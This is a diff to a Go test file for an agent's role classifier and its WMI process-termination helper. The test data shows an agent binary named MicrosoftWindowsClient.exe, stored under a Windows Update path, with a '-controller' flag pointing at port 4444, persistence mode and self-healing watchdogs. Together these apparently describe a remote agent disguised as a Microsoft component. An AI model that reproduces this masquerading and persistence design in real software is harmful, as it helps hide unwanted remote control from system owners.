@@ -1,28 +1,37 @@
-//go:build windows
-
 package main
 
-import "testing"
+import (
+	"strings"
+	"testing"
+)
 
-// agentRole must never classify supervisors/services/healers as full
-// agents: misclassification means the reaper kills its own watchdog.
-func TestAgentRole(t *testing.T) {
-	cases := []struct {
-		cmdline string
-		want    string
-	}{
-		{`"C:\ProgramData\Microsoft\Windows\Update\MicrosoftWindowsClient.exe" -controller h:4444 -ca "c"`, "full"},
-		{`"C:\x\MicrosoftWindowsClient.exe" --watch`, "watch"},
-		{`"C:\x\MicrosoftWindowsClient.exe" --svc-heal`, "svc"},
-		{`"C:\x\MicrosoftWindowsClient.exe" --wmi-heal`, "wmi"},
-		{`"C:\x\MicrosoftWindowsClient.exe" -test`, "test"},
-		{`"C:\x\MicrosoftWindowsClient.exe" -persist`, "persist"},
-		{`"C:\x\agent.exe" --watch`, "watch"},
-		{`"C:\x\agent.exe"`, "full"},
+// wmiTermCmd must name the exact PID, single-call form (v1.46.92: batch
+// invokes OOM the provider — 12 errored on a 14-zombie box, singles work).
+func TestWmiTermCmd(t *testing.T) {
+	got := wmiTermCmd(48584)
+	if !strings.Contains(got, "ProcessId=48584") || !strings.Contains(got, "Terminate") {
+		t.Fatalf("cmd = %q", got)
 	}
-	for _, c := range cases {
-		if got := agentRole(c.cmdline); got != c.want {
-			t.Fatalf("agentRole(%q) = %q, want %q", c.cmdline, got, c.want)
+	if strings.Contains(got, "485840") || strings.Count(got, "48584") != 1 {
+		t.Fatalf("pid must appear exactly once: %q", got)
+	}
+}
+
+// agentRole gates reaping: only bare full agents are ever touched.
+func TestAgentRole(t *testing.T) {
+	for cmd, want := range map[string]string{
+		`C:\x\MicrosoftWindowsClient.exe -controller a:4444`: "full",
+		`"C:\x\MicrosoftWindowsClient.exe" --watch`:          "watch",
+		`agent.exe --svc-heal`:    "svc",
+		`agent.exe --wmi-heal`:    "wmi",
+		`a.exe -test`:             "test",
+		`a.exe -persist`:          "persist",
+		`a.exe --WATCH`:           "watch",
+		`watchdog.exe -watchful`:  "full",
+		``:                        "full",
+	} {
+		if got := agentRole(cmd); got != want {
+			t.Fatalf("role %q = %q want %q", cmd, got, want)
 		}
 	}
 }
